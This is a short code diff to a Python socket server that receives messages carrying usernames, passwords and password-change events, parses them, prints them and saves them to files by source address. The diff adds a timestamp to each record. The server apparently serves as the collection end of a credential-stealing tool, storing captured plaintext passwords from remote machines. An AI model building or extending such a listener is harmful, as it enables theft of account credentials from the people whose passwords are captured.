@@ -2,6 +2,7 @@ import socket
 import threading
 import argparse
 import os
+import datetime
 
 print_lock = threading.Lock()
 
@@ -17,7 +18,8 @@ def handle_client(conn, addr):
         type = 'Password Change'
         username = strData[2:strData.find(':')]
     password = strData[strData.find(':')+1:strData.find(';end')]
-    storage = f"\nSource: {addr}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
+    timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
+    storage = f"\nTimestamp: {timestamp}\nSource: {addr}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
     print(storage)
     writeFile(storage, addr)
     if not data:
